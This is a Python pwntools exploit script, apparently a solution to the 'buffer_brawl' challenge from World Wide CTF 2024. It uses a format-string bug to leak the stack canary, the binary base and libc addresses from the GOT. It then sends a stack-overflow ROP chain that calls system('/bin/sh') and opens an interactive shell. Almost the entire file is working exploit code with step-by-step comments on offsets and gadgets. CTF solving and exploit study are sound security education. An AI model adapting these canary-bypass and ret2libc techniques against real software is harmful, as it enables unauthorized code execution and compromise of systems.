# https://github.com/xchg2pwn/BinaryExploitation/blob/main/WorldWideCTF/BufferBrawl/exploit.py
# https://ctf101.org/binary-exploitation/stack-canaries/
# https://seyd.ca/posts/2024/12/world-wide-ctf-2024-writeups/
from pwn import *

# this reads the SYMBOL addr from the got
# to get the symbol_offset for puts(): `disass 'puts@plt'` -> 0x3fa0 (puts@got offset)
def leak_libc_symbol(shell, symbol_offset):
    # Explanation:
    #   the b"%8$sTZZ\n".ljust(16, b"\00") is a 16 byte str passed to printf (needs to be 8 byte to align the next argument in the stack)
    #   and `p64(bin_base_addr + symbol_offset + offset)` is the format argument for printf()
    #   so we will have a call like this:
    #       `printf(b"%8$sTZZ\n".ljust(16, b"\00"), p64(bin_base_addr + symbol_offset + offset))`;
    #   this will take the addr to SYMBOL@got as a ptr to a str and read the addr from the got, leaking the SYMBOL addr
    offset = 0
    symbol_addr = b""
    symbol_addr_len = 0
    while symbol_addr_len < 6:
        # we need the 'TZZ' as delimeter in the case we have a 0x0a ('\n') in the address, so we read until 'TZZ\n' and cannot just read a line
        # the new line forces printf to actually print to stdout
        # Note: in theory, 'TZZ\n' could happen in the addr but this is so unlikely that i think it can be ignored
        payload = b"%8$sTZZ\n".ljust(16, b"\00") + p64(bin_base_addr + symbol_offset + offset)
        shell.sendlineafter(b"> ", b"4")
        shell.sendlineafter(b"?\n", payload)

        # read the result and ignore 'TZZ\n'
        symbol_addr += shell.recvuntil(b"TZZ\n")[:-4]
        symbol_addr_len += len(symbol_addr)

        # check if we got a null byte in the address
        if symbol_addr_len < 6:
            offset += symbol_addr_len
            symbol_addr_len += 1
            symbol_addr += b"\00"

    return u64(symbol_addr.ljust(8, b"\00"))

if __name__ == '__main__':
    # set the terminal to use
    context.terminal = ["gnome-terminal", "--"]

    # open connection with the binary
    # shell = gdb.debug("./buffer_brawl", "continue")
    shell = process("./buffer_brawl")

    # leak the stack canary
    shell.sendlineafter(b"> ", b"4")
    shell.sendlineafter(b"?\n", b"%11$p")
    canary = int(shell.recvline().strip().decode("utf-8"), 16)
    log.info(f"Stack canary: {hex(canary)}")

    # leak the binary base address
    shell.sendlineafter(b"> ", b"4")
    shell.sendlineafter(b"?\n", b"%13$p")
    bin_base_addr = int(shell.recvline().strip().decode("utf-8"), 16) - 0x1747
    log.info(f"Binary base address: {hex(bin_base_addr)}")

    # leak the puts addr
    puts_addr = leak_libc_symbol(shell, 0x3fa0)
    log.info(f"puts() addr: {hex(puts_addr)}")

    # leak the printf addr (the same way we leaked the puts addr) for redundancy in detecting the libc version
    printf_addr = leak_libc_symbol(shell, 0x3fb0)
    log.info(f"printf() addr: {hex(printf_addr)}")

    # from https://libc.rip/ we get that the puts offset is 0x5daa0
    # we get this by using the addr of both the puts function and printf (this gives us a single option for the libc version)
    libc_base = puts_addr - 0x5daa0
    log.info(f"Libc base: {hex(libc_base)}")

    # get the stack to 0xd (13) points (fastest way)
    for _ in range(29):
        shell.sendlineafter(b"> ", b"3")

    # from pwndbg, the rip is at offset 40 (using the cyclic pattern)
    # this means that the canary is at offset 24 (40 - 8 - 8); need to compensate for the rbp and the rip itself
    payload  = b"A" * 24
    payload += p64(canary)               # make sure the canary is correct
    payload += b"B" * 8                  # overwrite the rbp
    payload += p64(libc_base + 0xdc936)  # overwrite the rip (`rop --grep "pop rdi" -- --nojop --depth 2` --> pop rdi ; ret)

    # now add the arguments for system() to the payload
    payload += p64(libc_base + 0x1b1f0e) # addr to a "/bin/sh" str in libc (`search "/bin/sh"`)
    payload += p64(libc_base + 0x15cbe8) # xchg ebx, eax ; ret -> xchg does nothing for this exploit (this gadget is needed to align the stack)
    payload += p64(libc_base + 0x2ed30)  # add the return addr (jump to system())

    shell.sendlineafter(b": ", payload)
    shell.recvline()
    shell.interactive()
